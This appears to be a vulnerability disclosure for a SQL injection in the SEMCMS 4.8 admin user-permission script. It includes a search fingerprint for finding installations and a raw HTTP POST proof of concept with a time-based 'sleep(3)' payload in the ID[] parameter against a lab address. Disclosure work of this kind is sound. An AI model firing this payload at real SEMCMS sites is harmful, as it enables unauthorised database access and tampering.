SEMCMS foreign trade website management system has foreground sql injection vulnerability

website address：http://www.sem-cms.com
Vulnerability Overview:

SEMCMS is a foreign trade website content management system (CMS) that supports multiple languages. Due to the permission assignment function, CF=feipei ID parameter input in SEMCMS_User.php is not filtered, resulting in sql injection vulnerability
 

app="SEMCMS"

![图片](https://github.com/lampSEC/semcms/assets/88041357/d0575565-21de-4e1b-b204-ab27abed3b05)


Download address

http://www.sem-cms.com/TradeCmsdown/php/semcms_php_4.8.zip

![image](https://github.com/lampSEC/semcms/assets/88041357/8817ca27-7cc1-40e0-b1aa-0608a9be88e5)


ID Permission parameters Concatenate sql statements without filtering
 



![image](https://github.com/lampSEC/semcms/assets/88041357/c449aff6-00a4-4297-86bc-70e2c0473446)


（The uid parameter is the user ID. The administrator permission is modified again this time. After the test is completed, the database is modified to restore the permission ）
The original permission of the administrator : 74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181

![image](https://github.com/lampSEC/semcms/assets/88041357/e3ca438c-e988-4cc6-b4d4-15954fd45bd8)


poc

![image](https://github.com/lampSEC/semcms/assets/88041357/29047e76-a987-4d3c-9f55-40f3eda297b8)




![image](https://github.com/lampSEC/semcms/assets/88041357/324feef4-9c03-42e3-bb6a-c99ad3827dac)


sleep 3 seconds

![image](https://github.com/lampSEC/semcms/assets/88041357/9bdde0ab-f8e8-4699-9349-c26c118343f9)


![image](https://github.com/lampSEC/semcms/assets/88041357/33f660ae-fcf6-49f1-86cd-61414573fc75)


 ```
 POST /MtHDbu_Admin/SEMCMS_User.php?CF=fenpei HTTP/1.1
 Host: 192.168.96.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 28
 Origin: http://192.168.96.1
 Connection: close
 Upgrade-Insecure-Requests: 1
 
 ID[]=77'+and+sleep(3)#&uid=1
 ```



 

Sqlmap authentication ：

![image](https://github.com/lampSEC/semcms/assets/88041357/90a99dbd-f67b-440d-871d-c66fb1de7db5)


The test is complete. Modify the database administrator rights

74,76,77,87,88,116,123,170,75,78,79,80,81,82,83,84,89,100,181

![image](https://github.com/lampSEC/semcms/assets/88041357/17b8e1d4-015f-4387-8c2d-4fd69a27a09e)


Test completed (If you do not want to change administrator permissions, you can create a test user again)

 
